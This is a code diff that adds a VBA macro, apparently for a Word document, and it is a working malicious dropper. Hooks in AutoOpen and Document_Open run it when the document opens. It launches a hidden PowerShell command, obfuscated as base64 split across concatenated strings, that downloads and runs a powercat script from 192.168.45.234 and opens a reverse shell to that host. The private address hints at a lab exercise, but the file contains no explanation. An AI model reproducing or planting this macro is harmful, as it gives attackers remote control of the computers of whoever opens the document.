@@ -1,0 +1,23 @@
+Sub AutoOpen()
+    MyMacro
+End Sub
+
+Sub Document_Open()
+    MyMacro
+End Sub
+
+Sub MyMacro()
+    Dim Str As String
+    
+    Str = Str + "powershell.exe -nop -w hidden -e SQBFAFgAKABOAGUAd"
+        Str = Str + "wAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAA"
+        Str = Str + "uAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhA"
+        Str = Str + "GQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADI"
+        Str = Str + "ALgAxADYAOAAuADQANQAuADIAMwA0AC8AcABvAHcAZQByAGMAY"
+        Str = Str + "QB0AC4AcABzADEAJwApADsAcABvAHcAZQByAGMAYQB0ACAALQB"
+        Str = Str + "jACAAMQA5ADIALgAxADYAOAAuADQANQAuADIAMwA0ACAALQBwA"
+        Str = Str + "CAANAA0ADMAIAAtAGUAIABwAG8AdwBlAHIAcwBoAGUAbABsAA="
+        Str = Str + "="
+
+    CreateObject("Wscript.Shell").Run Str
+End Sub
